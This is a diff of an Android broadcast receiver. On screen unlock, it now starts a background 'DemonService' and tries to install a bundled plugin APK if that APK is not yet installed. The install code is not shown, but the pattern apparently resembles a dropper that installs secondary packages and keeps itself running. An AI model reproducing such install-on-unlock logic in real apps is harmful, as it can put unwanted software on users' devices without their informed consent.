@@ -1,11 +1,13 @@
-package com.xstd.qm.service;
+package com.xstd.qm.receiver;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.qm.Config;
+import com.xstd.qm.DemonService;
 import com.xstd.qm.UtilOperator;
+import com.xstd.qm.AppRuntime;
 
 /**
  * Created with IntelliJ IDEA.
@@ -27,9 +29,17 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                 || intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
                 Config.LOGD("<<<< " + intent.getAction() + " >>>>>"
                                 + " function screen status : " + UtilsRuntime.isScreenLocked(context));
+
                 //try to install
                 if (UtilOperator.isPluginApkExist()
                         && !UtilsRuntime.isPackageHasInstalled(context, Config.PLUGIN_PACKAGE_NAME)) {
+
+                    if (!AppRuntime.SERVICE_RUNNING) {
+                        Intent i = new Intent();
+                        i.setClass(context, DemonService.class);
+                        context.startService(i);
+                    }
+
                     UtilOperator.tryToInstallPluginLocal(context);
                 }
             } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
